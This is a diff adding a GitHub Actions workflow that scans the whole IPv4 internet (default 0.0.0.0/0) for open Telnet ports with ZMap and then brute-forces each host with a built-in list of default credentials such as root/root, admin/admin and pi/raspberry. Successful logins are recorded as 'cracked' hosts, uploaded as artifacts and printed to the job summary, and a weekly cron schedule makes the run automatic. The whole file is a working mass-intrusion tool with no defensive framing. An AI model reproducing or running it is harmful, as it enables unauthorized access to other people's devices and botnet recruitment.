@@ -1,0 +1,155 @@
+name: Telnet Scanner + Bruteforce
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_range:
+        description: 'Target CIDR range'
+        required: false
+        default: '0.0.0.0/0'
+      ports:
+        description: 'Ports to scan'
+        required: false
+        default: '23'
+      rate:
+        description: 'ZMap scan rate'
+        required: false
+        default: '10000'
+      threads:
+        description: 'Bruteforce threads'
+        required: false
+        default: '50'
+      timeout:
+        description: 'Connection timeout (seconds)'
+        required: false
+        default: '3'
+  schedule:
+    - cron: '0 0 * * 0'  # Run every Sunday at midnight
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install Dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y zmap netcat-openbsd
+          pip install requests
+
+      - name: Run ZMap Scanner
+        run: |
+          echo "[*] Starting ZMap scan..."
+          sudo zmap -p ${{ github.event.inputs.ports || '23' }} \
+            -f "saddr" \
+            --rate=${{ github.event.inputs.rate || '10000' }} \
+            ${{ github.event.inputs.target_range || '0.0.0.0/0' }} \
+            2>/dev/null | sort -u > live_hosts.txt
+          echo "[✔] Found $(wc -l < live_hosts.txt) live hosts"
+          
+      - name: Upload Live Hosts
+        uses: actions/upload-artifact@v4
+        with:
+          name: live-telnet-hosts
+          path: live_hosts.txt
+
+      - name: Bruteforce Scanner
+        run: |
+          echo "[*] Starting bruteforce..."
+          python3 << 'PYEOF'
+          import socket
+          import threading
+          import time
+          import os
+
+          TIMEOUT = int(os.environ.get('TIMEOUT', '3'))
+          THREADS = int(os.environ.get('THREADS', '50'))
+          
+          CREDS = [
+              ("root", "root"), ("admin", "admin"), ("admin", ""), ("root", ""),
+              ("root", "admin"), ("root", "123456"), ("admin", "123456"),
+              ("root", "password"), ("admin", "password"),
+              ("root", "toor"), ("root", "default"), ("admin", "default"),
+              ("user", "user"), ("guest", "guest"),
+              ("pi", "raspberry"), ("ubnt", "ubnt"),
+          ]
+          
+          results = []
+          lock = threading.Lock()
+          
+          def try_login(ip, user, passwd):
+              try:
+                  s = socket.socket()
+                  s.settimeout(TIMEOUT)
+                  s.connect((ip, 23))
+                  s.settimeout(2)
+                  s.recv(4096)
+                  s.send((user + "\n").encode())
+                  time.sleep(0.1)
+                  s.recv(4096)
+                  s.send((passwd + "\n").encode())
+                  time.sleep(0.3)
+                  resp = s.recv(4096).decode(errors="ignore").lower()
+                  s.close()
+                  good = ["#", "$", ">", "welcome", "successful"]
+                  bad = ["incorrect", "denied", "invalid", "failed", "wrong"]
+                  return any(g in resp for g in good) and not any(b in resp for b in bad)
+              except:
+                  return False
+          
+          def worker(ips):
+              for ip in ips:
+                  for u, p in CREDS:
+                      if try_login(ip, u, p):
+                          with lock:
+                              results.append(f"{ip}:23,{u},{p}")
+                              print(f"[+] {ip}:23 -> {u}:{p}")
+                          break
+          
+          with open("live_hosts.txt") as f:
+              ips = [l.strip() for l in f if l.strip()]
+          
+          chunk = len(ips) // THREADS + 1
+          threads = []
+          for i in range(THREADS):
+              t = threading.Thread(target=worker, args=(ips[i*chunk:(i+1)*chunk],))
+              t.start()
+              threads.append(t)
+          
+          for t in threads:
+              t.join()
+          
+          with open("cracked.txt", "w") as f:
+              f.write("\n".join(results))
+          
+          print(f"\n[✔] Done. Cracked: {len(results)}/{len(ips)}")
+          PYEOF
+        env:
+          TIMEOUT: ${{ github.event.inputs.timeout || '3' }}
+          THREADS: ${{ github.event.inputs.threads || '50' }}
+
+      - name: Upload Cracked Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: cracked-hosts
+          path: cracked.txt
+
+      - name: Summary
+        run: |
+          echo "## Telnet Scanner Results" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "**Live Hosts:** $(wc -l < live_hosts.txt)" >> $GITHUB_STEP_SUMMARY
+          echo "**Cracked:** $(wc -l < cracked.txt)" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
+          cat cracked.txt >> $GITHUB_STEP_SUMMARY
+          echo '```' >> $GITHUB_STEP_SUMMARY
